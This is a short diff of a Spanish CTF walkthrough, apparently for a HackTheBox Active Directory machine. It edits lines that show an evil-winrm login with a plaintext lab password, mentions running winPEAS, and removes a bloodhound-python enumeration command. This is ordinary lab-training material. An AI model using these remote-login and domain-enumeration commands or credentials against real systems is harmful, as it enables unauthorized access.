@@ -108,11 +108,9 @@ Volvemos a listar recursos para ver si hay algo diferente
 Probamos con este usuario conectarnos a este servicio
 `evil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$`
 
-Conseguiremos acceder a la maquina atraves de WinRM
+Conseguiremos acceder a la maquina a través de WinRM
 Y obtendremos la flag
 
+Nos importamos winPEAS y vemos un registro llamado ADSync
 
-### BLOODHOUND
-Creamos el archivo de subida
-`bloodhound-python -d megabank.local -u mhope -p '4n0therD4y@n0th3r$' -ns 10.10.10.172 -c all --zip`
 
